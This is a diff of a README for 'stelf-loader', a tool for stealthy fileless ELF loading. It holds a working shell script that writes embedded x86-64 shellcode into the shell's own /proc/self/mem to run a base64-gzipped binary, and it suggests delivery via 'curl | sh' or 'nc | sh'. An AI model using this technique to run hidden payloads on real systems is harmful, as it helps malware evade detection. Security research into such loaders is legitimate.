@@ -3,14 +3,43 @@ A stealthy ELF loader - no files, no execve, no RWX
 
 Here's a simple "hello world" ELF (`test_elfs/syscall-static-pie.c`), packed using stelf-loader:
 
-```bash
-bash -c 'read a</proc/self/syscall;exec 3>/proc/self/mem 4< <(echo H4sIAElPCWMC/+3bz2vTYBgH8Ddts83Wrj1UqExmBA8K0623ge5H0c4IMuakNyeOrmJLYbJ2/kLRkxjK2MQ/QC+iN3cRxoZbYeA8ih6sF+llMGHgYE7HxMXnTd64JFosMg/i91PSJ+/zPu/7liSXNCRWmvSrYx1rIcZmWZixaYkxFpJjZvr9Xist29MLrb+snuziaYXSXiOdZcanPetTx+T7tEJfdjftRRW+tyMbyMrUmjHyXrM2Vorpsc+x1x8+0cITAAAAAAAAALA9biVO9Xgkfhtv8rJOxlvjYbPdLfKVth8llGtnAfpuZEGj1seqO+h1Ribm5eNkW9sdnzNntI8z1lNE3hUfMme0j6vjZa2ivMsZg+IQRCXnOM9vxlWYMzaI6BPbE4/Zdkf3z3ePeynq3HE/c0br2J9ZLAz9yXp9Yly141ltvdM0ro7Vzjq9/WK9Wo+nZFs3LK6ZE71Jfl5KPuN63eqPiDbvPzcrzTyqfzxyd/CNJ7757MHxzo02az7JNi8AAAAAAMD/Iqlqi9rN5WJiWU29mjpKGVV7G5JVLbGuFmnrYCu6fjnC97+UNfkb3bapC4l1nfDcwLyYQNVGK6qWLBsT0dDRyhS/xVKLyXL12Z7+NNtqqHmDzzjdwgePyQO8Qnsxx+daukdlc/xHL/XQ3sTAPE4fAAAAAAAAQE2kJu8R/mzXeI5KN+fdFOIUz1Mcp3hb1EWs+uv9TLoalpp21jdM0F35HmZuUx91Pc4L4o3hO55jwbobVCD6+L8K76i/197vOWkU8P6ztNXTWod5f0L0p83xAAAAAAAAAAAAAAAAAAAA22FtUx/mcUW8Ry2L/AHx4rH1DnRYtP2ibb1fHBAxKuIu1/zNIlrPur/q5nrSVuqvUtO53HCLki8MFjKpQ5cyaSWdu6BcyRQuKkOZkXSqoOSv5VODuVx+nx9XAwAAAAAAAMC/6TutykV2AGAAAA==|base64 -d|gunzip -);base64 -d<<<McCwCTH/vgAAAEAx0k0x0kGyIk0xwEn30E0xyQ8FSYnHSYnGQbwAEAAAMcCwCUyJ90yJ5rIDQbIyDwVNMe0xwDH/QLcETIn2TAHuTIniTCnqDwVJAcUhwHQKTTnldd9NAe7rxjHAsApMif9Miea6BQAAAA8FQf/n|dd status=none bs=1 seek=$[`cut -d\  -f9<<<$a`] >&3'
+```sh
+#!/bin/sh
+
+read a </proc/self/syscall
+exec 3>/proc/self/mem 4<<EOF
+blah
+EOF
+cat /dev/fd/4 >/dev/null
+(base64 -d <<EOF | gunzip -) >/dev/fd/4 &
+H4sIAAxYCmMC/+3bz2vTYBgH8Ddts83OrgUrTCYzggeF6dbbQPejaGcGMuakeHHi6Co2FCZr5y8U
+PYlh1M2/QC+iN3dRxsRtMHAeRQ/Oi/Qy3GDiQKZj4uLzJm9cEi0WfxzE76ekT97nfd73LUkuaUhs
+eiyoFlpWwoxNsghjExJjLCzHrPSbHXZadqZnG39YPdbG0wql/WZai3fqbzVmfpq1gFqQb9Iy3do2
+2tui8L1NWrUmU+uRmffzyvhxTYpNx4zYx9iLxXe0/igAAAAAAAAA/KariSMdPonfxlv8rJXx1kjE
+areLfLHpWwnlmlk1fdewkFkbYKXt8bsjE/PycbKj7Y1PmDs6x5nrKSLviXeYOzrHVfCyRlHe5o4h
+cQhqJfc430/GFZk7VokYENt9n9X2Ru/P9457Juq8cRdzR/vYH5vP9//Ket1iXKnjWWq9ozSugpXP
+Pr09Yr1yj6fkWDcirpnDXUl+XqYD5vW60R8Vbd5/clJ6fLfy3uCNvpe++PrD24da15rs+STHvAAA
+AAAAAP+LpKrP61eWhhNLaur5+AHKqPqrsKzqiVV1mLYWtmwY56J8/9OcLn+h2zZ1NrFqEJ7rnRET
+qPpQUdWTc+ZENHSoOM5vsdTh5Fzp2R58N9uHcP0an3GigQ8uyL28Qn86xedauEVlU/xHL3TQ3mjv
+DE4fAAAAAAAAQFmkOv9+/mzXfI5KN+ftFOIUT1EcoXhN1EXt+ks9TLoQkeo2V1aN0l35dmZt4+8N
+I84L4jWR676DoYrLVCD6+L8Kr6m/y9nv6zQLeP8J2ipprX28PyH609Z4AAAAAAAAAAAAAAAAAACA
+P2Fl3RjgcVm8Ry2L/G7x4rH9DnREtIOibb9fXC1irYhbPfPXi2g/6/5sWOtJG6m/Sk1nswMNSi7f
+l8+k9p7NpJV09rRyPpM/o/RnBtOpvJK7mEv1ZbO5nUFcDQAAAAAAAAD/pq/zmqTTAGAAAA==
+EOF
+base64 -d <<EOF | dd status=none bs=1 seek=$(($(echo $a|cut -d\  -f9))) >&3
+McCwCTH/vgBgAAAx0rIDTTHSQbIiTTHASffQTTHJDwVJicdJifZIifJIicYx/0C3BDHADwVIAcZI
+KcJ19DHAsApMif9MifYx0rIFDwVB/+c=
+EOF
 ```
+
+You could put this in a file and execute it, but that would slightly defeat the
+purpose. The intended usage scenario is to paste it directly into a terminal,
+or perhaps even `curl | sh` or `nc | sh`.
 
 This implementation currently relies on some hand-written x86-64 shellcode, but the
 general approach should be applicable cross-architecture.
 
-The current implementation works on both `static` and `static-pie` ELFs. However, dynamic ELFs are out of scope for this project.
+It works on both `static` and `static-pie` ELFs. However, dynamic ELFs are out of scope for this project.
 
 ## Bash self-injecting shellcode loader
 
